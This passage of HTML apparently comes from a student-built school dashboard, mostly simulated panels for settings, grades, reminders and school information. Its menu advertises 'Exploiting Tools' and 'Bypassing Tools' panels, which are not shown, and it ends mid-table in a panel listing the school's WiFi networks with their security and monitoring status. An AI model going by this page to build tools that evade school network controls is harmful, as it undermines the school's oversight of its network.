      <button onclick="dashboard.togglePanel('schoolInfoPanel'); dashboard.showNotification('You clicked: School Information', 'info')">🏫 School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel'); dashboard.showNotification('You clicked: Exploiting Tools', 'info')">🧨 Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel'); dashboard.showNotification('You clicked: Bypassing Tools', 'info')">🚪 Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel'); dashboard.showNotification('You clicked: VPN Websites', 'info')">🔐 VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel'); dashboard.showNotification('You clicked: Gaming Websites', 'info')">🎮 Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel'); dashboard.showNotification('You clicked: Music Websites', 'info')">🎵 Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel'); dashboard.showNotification('You clicked: Keyboard Tricks', 'info')">🎹 Keyboard Tricks</button>
    </div>

    <!-- Information Panels -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
        <!-- NEW: Settings Panel -->
        <div id="settingsPanel" class="info-panel">
            <h2>⚙️ System Settings</h2>

            <div class="settings-panel-category">
                <h3>General Settings</h3>
                <div class="setting-item">
                    <label>Logged in as:</label>
                    <span id="settingsLoggedInUser"></span>
                </div>
                <div class="setting-item">
                    <label>User Identifier:</label>
                    <span id="settingsLoggedInID"></span>
                </div>
                <div class="setting-item">
                    <label for="languageSelect">Default Language:</label>
                    <select id="languageSelect" onchange="dashboard.saveSetting('language', this.value); dashboard.showNotification('Language changed to: ' + this.value, 'info')">
                        <option value="en">English</option>
                        <option value="es">Español</option>
                        <option value="fr">Français</option>
                    </select>
                </div>
                <div class="setting-item">
                    <label for="timezoneSelect">Time Zone:</label>
                    <select id="timezoneSelect" onchange="dashboard.saveSetting('timezone', this.value); dashboard.showNotification('Time zone updated.', 'info')">
                        <option value="UTC">UTC</option>
                        <option value="America/New_York">EST</option>
                        <option value="America/Los_Angeles">PST</option>
                    </select>
                </div>
                <div class="setting-item">
                  <label for="dateFormatSelect">Date Format:</label>
                  <select id="dateFormatSelect" onchange="dashboard.saveSetting('dateFormat', this.value); dashboard.showNotification('Date format updated.', 'info')">
                      <option value="MM/DD/YYYY">MM/DD/YYYY</option>
                      <option value="DD/MM/YYYY">DD/MM/YYYY</option>
                      <option value="YYYY-MM-DD">YYYY-MM-DD</option>
                  </select>
                </div>
                <div class="setting-item">
                  <label for="autoSaveDataToggle">Automatically save data:</label>
                  <input type="checkbox" id="autoSaveDataToggle" onchange="dashboard.saveSetting('autoSaveData', this.checked); dashboard.showNotification('Auto-save ' + (this.checked ? 'enabled' : 'disabled'), 'info')">
                </div>
            </div>

            <div class="settings-panel-category">
                <h3>Appearance</h3>
                <div class="setting-item">
                    <label for="themeToggleSettings">Dark/Light Mode:</label>
                    <input type="checkbox" id="themeToggleSettings" onchange="dashboard.toggleTheme(); dashboard.showNotification('Theme switched.', 'info')">
                </div>
                <div class="setting-item">
                  <label for="accentColorPicker">Accent Color:</label>
                  <input type="color" id="accentColorPicker" value="#ff914d" onchange="dashboard.setAccentColor(this.value); dashboard.showNotification('Accent color changed.', 'info')">
                </div>
                <div class="setting-item">
                    <label for="fontSelect">Font Family:</label>
                    <select id="fontSelect" onchange="document.body.style.setProperty('--system-font', this.value); dashboard.saveSetting('fontFamily', this.value); dashboard.showNotification('Font family changed.', 'info')">
                        <option value="'Montserrat', sans-serif">Montserrat</option>
                        <option value="'Roboto', sans-serif">Roboto</option>
                        <option value="'Open Sans', sans-serif">Open Sans</option>
                        <option value="'Lato', sans-serif">Lato</option>
                    </select>
                </div>
                <div class="setting-item">
                  <label for="uiDensityRange">UI Density:</label>
                  <input type="range" id="uiDensityRange" min="0.8" max="1.2" step="0.05" value="1" oninput="document.documentElement.style.fontSize = (this.value * 16) + 'px'; dashboard.saveSetting('uiDensity', this.value); dashboard.showNotification('UI density updated: ' + this.value, 'info')">
                  <span><span id="uiDensityValue">1</span>x</span>
                </div>
                <div class="setting-item">
                  <label for="customBackgroundInput">Custom Background (URL):</label>
                  <input type="text" id="customBackgroundInput" placeholder="Enter image URL" style="width: 200px;"/>
                  <button onclick="dashboard.applyCustomBackground(document.getElementById('customBackgroundInput').value); dashboard.showNotification('Custom background applied (if valid URL).', 'info')">Apply</button>
                </div>
            </div>

            <div class="settings-panel-category">
                <h3>Notifications</h3>
                <div class="setting-item">
                    <label for="enableNotificationSound">Enable Notification Sound:</label>
                    <input type="checkbox" id="enableNotificationSound" checked onchange="dashboard.saveSetting('enableNotificationSound', this.checked); dashboard.showNotification('Notification sounds ' + (this.checked ? 'enabled' : 'disabled'), 'info')">
                </div>
                <div class="setting-item">
                  <label for="enableDesktopNotifications">Enable Desktop Notifications (Browser):</label>
                  <input type="checkbox" id="enableDesktopNotifications" onchange="dashboard.requestDesktopNotificationPermission(this.checked); dashboard.saveSetting('enableDesktopNotifications', this.checked); dashboard.showNotification('Desktop notifications preference updated.', 'info')">
                </div>
                <div class="setting-item">
                  <label for="notificationPersistence">Keep Notifications on Screen:</label>
                  <input type="checkbox" id="notificationPersistence" onchange="dashboard.saveSetting('notificationPersistence', this.checked); dashboard.showNotification('Notification persistence ' + (this.checked ? 'enabled' : 'disabled'), 'info')">
                </div>
                <div class="setting-item">
                    <label for="enableButtonPressNotifications">Notify on Button Presses:</label>
                    <input type="checkbox" id="enableButtonPressNotifications" checked onchange="dashboard.saveSetting('enableButtonPressNotifications', this.checked); dashboard.showNotification('Button press notifications ' + (this.checked ? 'enabled' : 'disabled'), 'info')">
                </div>
                <div class="setting-item">
                    <label for="enableReminderNotifications">Notify for Reminders:</label>
                    <input type="checkbox" id="enableReminderNotifications" checked onchange="dashboard.saveSetting('enableReminderNotifications', this.checked); dashboard.showNotification('Reminder notifications ' + (this.checked ? 'enabled' : 'disabled'), 'info')">
                </div>
            </div>

            <div class="settings-panel-category">
                <h3>Privacy & Security</h3>
                <div class="setting-item">
                    <label>Two-Factor Authentication:</label>
                    <button onclick="alert('2FA enrollment is a simulated feature.')">Enroll/Manage 2FA</button>
                </div>
                <div class="setting-item">
                    <label>Manage Active Sessions:</label>
                    <button onclick="alert('This is a simulated view of active sessions.')">View Sessions</button>
                </div>
                <div class="setting-item">
                  <label>Change Password:</label>
                  <button onclick="dashboard.showNotification('Password change is a simulated feature.', 'info')">Change Password</button>
                </div>
                <div class="setting-item">
                  <label>Export User Data:</label>
                  <button onclick="dashboard.exportUserData(); dashboard.showNotification('Exporting user data (simulated).', 'success')">Export Data</button>
                </div>
                <div class="setting-item">
                    <label>Clear Local Cache:</label>
                    <button onclick="if(confirm('Are you sure you want to clear local cache? This will reset some settings.')) { localStorage.clear(); alert('Local storage cleared. Reload page for full effect.'); location.reload(); dashboard.showNotification('Local cache cleared.', 'success') }">Clear Cache</button>
                </div>
                <div class="setting-item">
                    <label>Clear Browser Cookies:</label>
                    <button onclick="if(confirm('Are you sure you want to clear browser cookies?')) { document.cookie.split(';').forEach(function(c) { document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date().toUTCString() + ';path=/'); }); alert('Browser cookies cleared.'); dashboard.showNotification('Browser cookies cleared.', 'success')}">Clear Cookies</button>
                </div>
            </div>

            <div class="settings-panel-category">
                <h3>Accessibility</h3>
                <div class="setting-item">
                    <label for="highContrastMode">High Contrast Mode:</label>
                    <input type="checkbox" id="highContrastMode" onchange="document.body.classList.toggle('high-contrast'); dashboard.saveSetting('highContrast', this.checked); dashboard.showNotification('High contrast ' + (this.checked ? 'enabled' : 'disabled'), 'info')">
                </div>
                <div class="setting-item">
                    <label for="reduceMotion">Reduce Motion:</label>
                    <input type="checkbox" id="reduceMotion" onchange="document.body.classList.toggle('reduce-motion'); dashboard.saveSetting('reduceMotion', this.checked); dashboard.showNotification('Reduced motion ' + (this.checked ? 'enabled' : 'disabled'), 'info')">
                </div>
                <div class="setting-item">
                    <label for="screenReaderSupport">Screen Reader Support:</label>
                    <input type="checkbox" id="screenReaderSupport" onchange="dashboard.saveSetting('screenReader', this.checked); alert('Screen reader support toggle is simulated.'); dashboard.showNotification('Screen reader support preference updated.', 'info')">
                </div>
                <div class="setting-item">
                    <label for="cursorSize">Cursor Size:</label>
                    <input type="range" id="cursorSize" min="1" max="2" step="0.25" value="1" oninput="document.body.style.setProperty('--cursor-scale', this.value); document.getElementById('cursorSizeValue').textContent = this.value;">
                    <span id="cursorSizeValue">1</span>x
                </div>
            </div>

            <div class="settings-panel-category">
                <h3>Dashboard Layout</h3>
                <div class="setting-item">
                    <label>Customize Widget Order:</label>
                    <button onclick="alert('Widget reordering is a simulated feature.')">Reorder Widgets</button>
                </div>
                <div class="setting-item">
                    <label for="showUpdatesToggle">Show Updates Section:</label>
                    <input type="checkbox" id="showUpdatesToggle" checked onchange="document.getElementById('updatesNotifications').children[0].style.display = this.checked ? 'block' : 'none'; dashboard.saveSetting('showUpdates', this.checked); dashboard.showNotification('Updates section ' + (this.checked ? 'shown' : 'hidden'), 'info')">
                </div>
                <div class="setting-item">
                    <label for="showCalendarToggle">Show Calendar Section:</label>
                    <input type="checkbox" id="showCalendarToggle" checked onchange="document.getElementById('mainGrid').children[0].style.display = this.checked ? 'block' : 'none'; dashboard.saveSetting('showCalendar', this.checked); dashboard.showNotification('Calendar section ' + (this.checked ? 'shown' : 'hidden'), 'info')">
                </div>
                <div class="setting-item">
                    <label for="showMotivationToggle">Show Motivation Box:</label>
                    <input type="checkbox" id="showMotivationToggle" checked onchange="document.getElementById('motivationBox').style.display = this.checked ? 'flex' : 'none'; dashboard.saveSetting('showMotivation', this.checked); dashboard.showNotification('Motivation box ' + (this.checked ? 'shown' : 'hidden'), 'info')">
                </div>
            </div>

            <div class="settings-panel-category">
              <h3>Reminder Settings</h3>
              <div class="setting-item">
                <label for="defaultSnoozeDuration">Default Snooze Duration (min):</label>
                <input type="number" id="defaultSnoozeDuration" min="1" max="60" value="5" onchange="dashboard.saveSetting('defaultSnooze', this.value); dashboard.showNotification('Default snooze set to ' + this.value + ' minutes', 'info')">
              </div>
              <div class="setting-item">
                <label for="reminderSoundSelect">Reminder Sound:</label>
                <select id="reminderSoundSelect" onchange="dashboard.saveSetting('reminderSound', this.value); dashboard.showNotification('Reminder sound updated.', 'info')">
                  <option value="default">Default Alert</option>
                  <option value="chime">Chime</option>
                  <option value="beep">Beep</option>
                </select>
              </div>
            </div>

            <div class="settings-panel-category">
              <h3>Advanced</h3>
              <div class="setting-item">
                <label for="experimentalFeaturesToggle">Enable Experimental Features:</label>
                <input type="checkbox" id="experimentalFeaturesToggle" onchange="dashboard.saveSetting('experimentalFeatures', this.checked); alert('Experimental features ' + (this.checked ? 'enabled' : 'disabled') + '. Use with caution!'); dashboard.showNotification('Experimental features ' + (this.checked ? 'enabled' : 'disabled'), 'error')">
              </div>
              <div class="setting-item">
                <label>Reset All Settings:</label>
                <button onclick="if(confirm('Are you sure you want to reset all settings to default?')) { dashboard.resetSettings(); dashboard.showNotification('All settings reset to default. Reload page for full effect.', 'success') }">Reset to Defaults</button>
              </div>
            </div>

            <div class="settings-panel-category">
                <h3>About</h3>
                <div class="setting-item">
                    <label>Version:</label>
                    <span>1.5.6.ALPHA</span>
                </div>
                <div class="setting-item">
                    <label>Build Date:</label>
                    <span>August 23, 2025</span>
                </div>
                <div class="setting-item">
                    <label>Developer Credits:</label>
                    <span>Nuker214 & Gemini AI</span>
                </div>
                <div class="setting-item">
                    <label>License:</label>
                    <span>Proprietary Private System</span>
                </div>
            </div>

        </div>

        <!-- NEW: Reminder System Panel -->
        <div id="reminderSystemPanel" class="info-panel">
            <h2>🔔 My Reminders</h2>
            <div class="reminder-input-group">
                <label for="reminderText">Reminder Description:</label>
                <input type="text" id="reminderText" placeholder="e.g., Submit science project" />
                
                <label for="reminderDate">Date:</label>
                <input type="date" id="reminderDate" />
                
                <label for="reminderTime">Time:</label>
                <input type="time" id="reminderTime" />
                
                <button id="addReminderBtn" onclick="dashboard.addReminder()">Add Reminder</button>
            </div>

            <h3>Upcoming Reminders</h3>
            <div id="upcomingRemindersList" class="reminders-list-container">
                <p>No upcoming reminders.</p>
            </div>

            <h3>Completed Reminders</h3>
            <div id="completedRemindersList" class="reminders-list-container">
                <p>No completed reminders.</p>
            </div>
            <div class="reminder-controls">
                <button onclick="dashboard.clearCompletedReminders(); dashboard.showNotification('Cleared completed reminders.', 'info')">Clear Completed</button>
                <button onclick="dashboard.clearAllReminders(); dashboard.showNotification('Cleared all reminders.', 'info')">Clear All</button>
            </div>
        </div>

        <!-- NEW: User Profile Panel -->
        <div id="userProfilePanel" class="info-panel">
          <h2>👤 User Profile</h2>
          <p class="coming-soon">User Profile features coming soon!</p>
          <div class="info-text">
            <h3>Profile Details:</h3>
            <p><strong>Name:</strong> <span id="profileUserName">Beta User</span></p>
            <p><strong>Username:</strong> <span id="profileUserUsername">Beta.user</span></p>
            <p><strong>User ID:</strong> <span id="profileUserID">281573</span></p>
            <p><strong>Rank:</strong> <span id="profileUserRank">User</span></p>
            <p><strong>Role:</strong> <span id="profileUserRole">Student</span></p>
            <p><strong>Account Creation:</strong> <span id="profileAccountCreation">Unknown</span></p>
            <h3>Account Actions:</h3>
            <p>Edit Profile <button onclick="dashboard.showNotification('Editing profile is simulated.', 'info')">Edit</button></p>
            <p>Change Profile Picture <button onclick="dashboard.showNotification('Changing profile picture is simulated.', 'info')">Change</button></p>
          </div>
        </div>

        <!-- NEW: Message Center Panel -->
        <div id="messageCenterPanel" class="info-panel">
          <h2>✉️ Message Center</h2>
          <p class="coming-soon">Secure Messaging system coming soon!</p>
          <div class="info-text">
            <h3>Inbox:</h3>
            <p>You have <strong>3 new messages</strong>.</p>
            <ul>
                <li>From: Admin - Subject: System Update (Today)</li>
                <li>From: Teacher A - Subject: Homework Reminder (Yesterday)</li>
                <li>From: Friend B - Subject: Project Question (2 days ago)</li>
            </ul>
            <h3>Compose New Message:</h3>
            <p>To: <input type="text" placeholder="Recipient" style="width: 150px; padding: 5px;"></p>
            <p>Subject: <input type="text" placeholder="Subject" style="width: 200px; padding: 5px;"></p>
            <textarea placeholder="Your message..." style="width: 100%; height: 100px; padding: 5px;"></textarea><br>
            <button onclick="dashboard.showNotification('Sending message (simulated).', 'success')">Send</button>
          </div>
        </div>

        <!-- NEW: File Manager Panel -->
        <div id="fileManagerPanel" class="info-panel">
          <h2>🗄️ File Manager</h2>
          <p class="coming-soon">Cloud File Management coming soon!</p>
          <div class="info-text">
            <h3>My Files:</h3>
            <ul>
                <li>📄 Document.pdf (1.2 MB)</li>
                <li>📁 ProjectX (Folder, 5 items)</li>
                <li>🖼️ Image.jpg (500 KB)</li>
                <li>📝 Notes.txt (30 KB)</li>
            </ul>
            <p><button onclick="dashboard.showNotification('Uploading file (simulated).', 'info')">Upload File</button> <button onclick="dashboard.showNotification('Creating new folder (simulated).', 'info')">New Folder</button></p>
          </div>
        </div>

        <!-- NEW: Task Tracker Panel -->
        <div id="taskTrackerPanel" class="info-panel">
          <h2>✅ Task Tracker</h2>
          <p class="coming-soon">Task and Assignment Tracker coming soon!</p>
          <div class="info-text">
            <h3>Current Tasks:</h3>
            <ul>
                <li>[ ] Finish Math Homework (Due: Aug 25)</li>
                <li>[X] Read Chapter 3 (Completed: Aug 22)</li>
                <li>[ ] Study for History Quiz (Due: Aug 27)</li>
            </ul>
            <p>Add New Task: <input type="text" placeholder="New task description" style="width: 200px; padding: 5px;"></p>
            <button onclick="dashboard.showNotification('Task added (simulated).', 'success')">Add Task</button>
          </div>
        </div>

        <!-- NEW: Student Resources Panel -->
        <div id="studentResourcesPanel" class="info-panel">
          <h2>📚 Student Resources</h2>
          <p>Access a wide range of helpful resources for students.</p>
          <div class="links-grid">
              <a href="https://example.edu/tutoring" target="_blank" onclick="dashboard.showNotification('Navigating to Tutoring Services.', 'info')">Tutoring Services</a>
              <a href="https://example.edu/career" target="_blank" onclick="dashboard.showNotification('Navigating to Career Counseling.', 'info')">Career Counseling</a>
              <a href="https://example.edu/wellness" target="_blank" onclick="dashboard.showNotification('Navigating to Student Wellness.', 'info')">Student Wellness</a>
              <a href="https://example.edu/advising" target="_blank" onclick="dashboard.showNotification('Navigating to Academic Advising.', 'info')">Academic Advising</a>
              <a href="https://example.edu/financial-aid" target="_blank" onclick="dashboard.showNotification('Navigating to Financial Aid Information.', 'info')">Financial Aid Info</a>
              <a href="https://example.edu/scholarships" target="_blank" onclick="dashboard.showNotification('Navigating to Scholarships Portal.', 'info')">Scholarships Portal</a>
              <a href="https://example.edu/textbooks" target="_blank" onclick="dashboard.showNotification('Navigating to Textbook Information.', 'info')">Textbook Information</a>
              <a href="https://example.edu/clubs" target="_blank" onclick="dashboard.showNotification('Navigating to Clubs & Organizations.', 'info')">Clubs & Orgs</a>
          </div>
        </div>

        <!-- NEW: Faculty & Staff Panel -->
        <div id="facultyStaffPanel" class="info-panel">
          <h2>🧑‍🏫 Faculty & Staff Directory</h2>
          <p class="coming-soon">Full Faculty & Staff directory coming soon!</p>
          <div class="info-text">
            <h3>Key Personnel:</h3>
            <p><strong>Principal:</strong> Dr. Shannon L. Wevodau</p>
            <p><strong>Assistant Principal:</strong> Mr. Michael DeFilippo</p>
            <p><strong>Guidance Counselor:</strong> Ms. Jane Doe</p>
            <p><strong>Science Department Head:</strong> Mr. John Smith</p>
            <p><strong>Search Staff:</strong> <input type="text" placeholder="Teacher name..." style="width: 180px; padding: 5px;"></p>
            <button onclick="dashboard.showNotification('Searching staff (simulated).', 'info')">Search</button>
          </div>
        </div>

        <!-- NEW: Calendar Events Panel -->
        <div id="calendarEventsPanel" class="info-panel">
          <h2>🗓️ Detailed Calendar Events</h2>
          <p class="coming-soon">Detailed event viewing and management coming soon!</p>
          <div class="info-text">
            <h3>Upcoming School Events:</h3>
            <ul>
              <li><strong>August 28:</strong> Back-to-School Night (6:00 PM)</li>
              <li><strong>September 1:</strong> Labor Day - No School</li>
              <li><strong>September 15:</strong> Picture Day</li>
              <li><strong>September 22:</strong> Parent-Teacher Conferences</li>
            </ul>
            <button onclick="dashboard.showNotification('Loading more events (simulated).', 'info')">Load More Events</button>
          </div>
        </div>

        <!-- NEW: Announcements Board Panel -->
        <div id="announcementsBoardPanel" class="info-panel">
          <h2>📣 Detailed Announcements Board</h2>
          <p class="coming-soon">Full-featured Announcements Board coming soon!</p>
          <div class="info-text">
            <h3>Recent Announcements:</h3>
            <ul>
              <li><strong>Aug 23:</strong> New library hours starting next week.</li>
              <li><strong>Aug 22:</strong> Reminder: Student parking permits required.</li>
              <li><strong>Aug 20:</strong> Sign-ups for Fall sports are now open!</li>
            </ul>
            <button onclick="dashboard.showNotification('Viewing all announcements (simulated).', 'info')">View All Announcements</button>
          </div>
        </div>

        <!-- NEW: Grade Book Panel -->
        <div id="gradeBookPanel" class="info-panel">
          <h2>📈 Grade Book</h2>
          <p class="coming-soon">Personalized Grade Book access coming soon!</p>
          <div class="info-text">
            <h3>Your Grades:</h3>
            <p><strong>Mathematics:</strong> B+ (88%)</p>
            <p><strong>Science:</strong> A- (91%)</p>
            <p><strong>History:</strong> B (85%)</p>
            <p><strong>English:</strong> A (93%)</p>
            <p>For more details, please visit the PowerSchool link in Student Websites.</p>
          </div>
        </div>

        <!-- NEW: Attendance Records Panel -->
        <div id="attendanceRecordsPanel" class="info-panel">
          <h2>✔️ Attendance Records</h2>
          <p class="coming-soon">Detailed Attendance Records coming soon!</p>
          <div class="info-text">
            <h3>Summary for current academic year:</h3>
            <p><strong>Absences:</strong> 2 (1 excused, 1 unexcused)</p>
            <p><strong>Tardies:</strong> 0</p>
            <p>Last recorded attendance: Present - August 23</p>
            <p>Request Attendance Report <button onclick="dashboard.showNotification('Requesting attendance report (simulated).', 'info')">Request Report</button></p>
          </div>
        </div>

        <!-- NEW: Bus Schedules Panel -->
        <div id="busSchedulesPanel" class="info-panel">
          <h2>🚌 Bus Schedules</h2>
          <p class="coming-soon">Real-time Bus Schedules coming soon!</p>
          <div class="info-text">
            <h3>Your Assigned Bus:</h3>
            <p><strong>Bus Route:</strong> #257</p>
            <p><strong>Morning Pickup:</strong> 7:15 AM at Oak Street & Elm Avenue</p>
            <p><strong>Afternoon Drop-off:</strong> 3:30 PM at Oak Street & Elm Avenue</p>
            <p>View all Routes <button onclick="dashboard.showNotification('Viewing all bus routes (simulated).', 'info')">View Routes</button></p>
          </div>
        </div>

        <!-- NEW: Cafeteria Menu Panel -->
        <div id="cafeteriaMenuPanel" class="info-panel">
          <h2>🍽️ Cafeteria Menu</h2>
          <p class="coming-soon">Daily Cafeteria Menu coming soon!</p>
          <div class="info-text">
            <h3>Today's Menu: (August 23)</h3>
            <ul>
              <li><strong>Lunch Entrée:</strong> Chicken Nuggets with Fries</li>
              <li><strong>Vegetable:</strong> Steamed Green Beans</li>
              <li><strong>Fruit:</strong> Apple Slices</li>
              <li><strong>Drink:</strong> Milk (various types) / Water</li>
            </ul>
            <p>Tomorrow's Menu <button onclick="dashboard.showNotification('Viewing tomorrow\'s menu (simulated).', 'info')">Next Day</button></p>
          </div>
        </div>

        <!-- NEW: Library Portal Panel -->
        <div id="libraryPortalPanel" class="info-panel">
          <h2>🏛️ Library Portal</h2>
          <p class="coming-soon">Access to school library resources coming soon!</p>
          <div class="info-text">
            <h3>Library Quick Links:</h3>
            <a href="https://example.edu/library-catalog" target="_blank" onclick="dashboard.showNotification('Navigating to Library Catalog.', 'info')">Library Catalog</a>
            <a href="https://example.edu/research-databases" target="_blank" onclick="dashboard.showNotification('Navigating to Research Databases.', 'info')">Research Databases</a>
            <a href="https://example.edu/ebooks" target="_blank" onclick="dashboard.showNotification('Navigating to E-Book Collection.', 'info')">E-Book Collection</a>
            <a href="https://example.edu/reservations" target="_blank" onclick="dashboard.showNotification('Navigating to Study Room Reservations.', 'info')">Study Room Reservations</a>
            <p class="coming-soon" style="text-align: left; margin-top: 20px;">Current Loans and Due Dates</p>
          </div>
        </div>

        <!-- NEW: Clubs & Activities Panel -->
        <div id="clubsActivitiesPanel" class="info-panel">
          <h2>🏅 Clubs & Activities</h2>
          <p class="coming-soon">Browse school clubs and activities here!</p>
          <div class="info-text">
            <h3>Featured Clubs:</h3>
            <ul>
              <li>Robotics Club (Meets Tuesdays)</li>
              <li>Debate Team (Meets Wednesdays)</li>
              <li>Art Club (Meets Fridays)</li>
              <li>Chess Club (Meets Thursdays)</li>
            </ul>
            <p>View all clubs <button onclick="dashboard.showNotification('Viewing all clubs (simulated).', 'info')">View All</button> Join a club <button onclick="dashboard.showNotification('Joining a club is simulated.', 'info')">Join</button></p>
          </div>
        </div>

        <!-- NEW: Athletics Info Panel -->
        <div id="athleticsInfoPanel" class="info-panel">
          <h2>🏈 Athletics Information</h2>
          <p class="coming-soon">Sports schedules and team information coming soon!</p>
          <div class="info-text">
            <h3>Fall Sports:</h3>
            <ul>
              <li>Football</li>
              <li>Soccer (Boys/Girls)</li>
              <li>Cross Country</li>
              <li>Volleyball</li>
            </ul>
            <p>Upcoming Games <button onclick="dashboard.showNotification('Viewing upcoming games (simulated).', 'info')">View Games</button> Practice Schedules <button onclick="dashboard.showNotification('Viewing practice schedules (simulated).', 'info')">Practices</button></p>
          </div>
        </div>

        <!-- NEW: School News Feed Panel -->
        <div id="schoolNewsFeedPanel" class="info-panel">
          <h2>📰 School News Feed</h2>
          <p class="coming-soon">Stay updated with the latest school news!</p>
          <div class="info-text">
            <h3>Latest Headlines:</h3>
            <ul>
              <li>"School Board Approves New STEM Program" (Published: Aug 21)</li>
              <li>"Students Volunteer for Community Clean-Up" (Published: Aug 19)</li>
              <li>"Principal's Message: Welcome Back to School!" (Published: Aug 18)</li>
            </ul>
            <button onclick="dashboard.showNotification('Loading more news (simulated).', 'info')">Read More News</button>
          </div>
        </div>

        <!-- NEW: Help & Support Panel -->
        <div id="helpSupportPanel" class="info-panel">
          <h2>❓ Help & Support</h2>
          <p class="coming-soon">Centralized Help and Support Portal coming soon!</p>
          <div class="info-text">
            <h3>Support Options:</h3>
            <p><strong>FAQs:</strong> <a href="#" onclick="dashboard.showNotification('Navigating to FAQs (simulated).', 'info')">Visit our Frequently Asked Questions.</a></p>
            <p><strong>Contact IT:</strong> <a href="#" onclick="dashboard.showNotification('Contacting IT (simulated).', 'info')">Submit an IT ticket.</a></p>
            <p><strong>Live Chat:</strong> <button onclick="dashboard.showNotification('Live chat (simulated) is unavailable.', 'info')">Start Chat</button></p>
          </div>
        </div>

        <!-- NEW: System Status Panel -->
        <div id="systemStatusPanel" class="info-panel">
          <h2>📊 System Status</h2>
          <p class="coming-soon">Monitor the health and performance of the system.</p>
          <div class="info-text">
            <h3>System Health:</h3>
            <p><strong>Dashboard Core:</strong> <span style="color: green; font-weight: bold;">Operational</span></p>
            <p><strong>Login Service:</strong> <span style="color: green; font-weight: bold;">Operational</span></p>
            <p><strong>Notification Service:</strong> <span style="color: green; font-weight: bold;">Operational</span></p>
            <p><strong>Reminder System:</strong> <span style="color: green; font-weight: bold;">Operational</span></p>
            <p><strong>Last Checked:</strong> <span id="lastStatusCheck">Just now</span></p>
            <button onclick="document.getElementById('lastStatusCheck').textContent = new Date().toLocaleTimeString(); dashboard.showNotification('Refreshing system status (simulated).', 'info')">Refresh Status</button>
          </div>
        </div>

        <!-- NEW: Developer Console Panel -->
        <div id="developerConsolePanel" class="info-panel">
          <h2>🧑‍💻 Developer Console</h2>
          <p class="coming-soon">Advanced developer tools and diagnostics.</p>
          <div class="info-text">
            <h3>Debug & Diagnostics:</h3>
            <p><strong>Log Viewer:</strong> <button onclick="console.log('Simulated Debug Log: Events recorded...'); dashboard.showNotification('Opening simulated log viewer.', 'info')">Open Log Viewer</button></p>
            <p><strong>API Key Management:</strong> <button onclick="dashboard.showNotification('API key management is a simulated feature.', 'info')">Manage Keys</button></p>
            <p><strong>Console Access:</strong> <button onclick="alert('Accessing internal console (simulated). Check browser console for real debugging.'); dashboard.showNotification('Attempting internal console access.', 'info')">Internal Console</button></p>
            <div class="code-display">
                <code>
                    // Simulated system diagnostic output<br>
                    > System.checkStatus();<br>
                    &nbsp;&nbsp;Module 'AuthService': Status OK<br>
                    &nbsp;&nbsp;Module 'DataPersistence': Status OK<br>
                    &nbsp;&nbsp;Module 'UIService': Status OK<br>
                    > Debug.loadMemorySnapshot();<br>
                    &nbsp;&nbsp;...loading<br>
                    &nbsp;&nbsp;...MemorySnapshot completed.<br>
                </code>
            </div>
          </div>
        </div>

        <!-- NEW: Accessibility Options Panel - Links to specific settings -->
        <div id="accessibilityOptionsPanel" class="info-panel">
          <h2>♿ Accessibility Options</h2>
          <p>Customize the interface for better accessibility.</p>
          <div class="info-text">
            <p>For detailed accessibility adjustments, please navigate to the <strong>Settings -> Accessibility</strong> section.</p>
            <p><button onclick="dashboard.togglePanel('settingsPanel'); setTimeout(() => { document.querySelector('#settingsPanel h3').scrollIntoView({ behavior: 'smooth' }); }, 500); dashboard.showNotification('Navigating to Accessibility settings.', 'info')">Go to Settings</button></p>
            <h3>Quick Toggles:</h3>
            <p><label for="quickHighContrast">High Contrast:</label> <input type="checkbox" id="quickHighContrast" onchange="document.body.classList.toggle('high-contrast'); dashboard.showNotification('High Contrast toggled from Quick Access.', 'info')"></p>
            <p><label for="quickReduceMotion">Reduce Motion:</label> <input type="checkbox" id="quickReduceMotion" onchange="document.body.classList.toggle('reduce-motion'); dashboard.showNotification('Reduced Motion toggled from Quick Access.', 'info')"></p>
          </div>
        </div>

        <!-- NEW: Feedback & Suggestions Panel -->
        <div id="feedbackSuggestionsPanel" class="info-panel">
          <h2>💡 Feedback & Suggestions</h2>
          <p class="coming-soon">Submit your feedback to help improve the system!</p>
          <div class="info-text">
            <h3>Submit Feedback:</h3>
            <textarea placeholder="Your feedback or suggestion..." style="width: 100%; height: 120px; padding: 10px;"></textarea><br>
            <button onclick="dashboard.showNotification('Feedback submitted! Thank you.', 'success')">Submit Feedback</button>
            <p style="margin-top: 15px;">Your input is valuable and helps us make the Private System better!</p>
          </div>
        </div>

        <!-- NEW: Emergency Protocol Panel -->
        <div id="emergencyProtocolPanel" class="info-panel">
          <h2>🚨 Emergency Protocol Information</h2>
          <p class="coming-soon">Access critical information for emergency situations.</p>
          <div class="info-text">
            <h3>Emergency Contact Numbers:</h3>
            <p><strong>School Office:</strong> 717-930-0739</p>
            <p><strong>District Security:</strong> 717-930-XXXX</p>
            <p><strong>Local Emergency Services (Police/Fire/Ambulance):</strong> 911</p>
            <h3>Procedures:</h3>
            <ul>
              <li><strong>Fire Alarm:</strong> Evacuate calmly to the designated assembly point.</li>
              <li><strong>Lockdown:</strong> Secure classrooms, remain quiet and out of sight.</li>
              <li><strong>Medical Emergency:</strong> Notify closest adult immediately.</li>
            </ul>
            <p>Always prioritize safety. Stay informed about school-specific emergency plans.</p>
          </div>
        </div>

      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div>Medium</div>
